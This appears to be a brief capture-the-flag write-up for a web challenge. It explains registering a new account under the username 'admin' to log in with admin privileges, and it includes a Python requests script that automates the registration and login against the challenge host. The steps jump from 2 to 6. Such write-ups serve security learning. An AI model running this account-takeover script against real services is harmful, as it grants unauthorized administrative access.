## Solution

1. Register on a website as username admin
2. Login using the admin credentials (The response was visible in burp repeater)
6. This was the code I came up with to automate the exploit:
```python
import requests

reg_url = "https://ch4466176071.ch.eng.run/api/register"
log_url = "https://ch4466176071.ch.eng.run/api/login"
headers = {"Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36", "Content-Type": "application/json"}
data_json={"password": "admin", "username": "admin"}
requests.post(reg_url, headers=headers, json=data_json)
res = requests.post(log_url, headers=headers, json=data_json)
print(res.json())
```
7. Simply replace the url with your instance url and run the code using python3
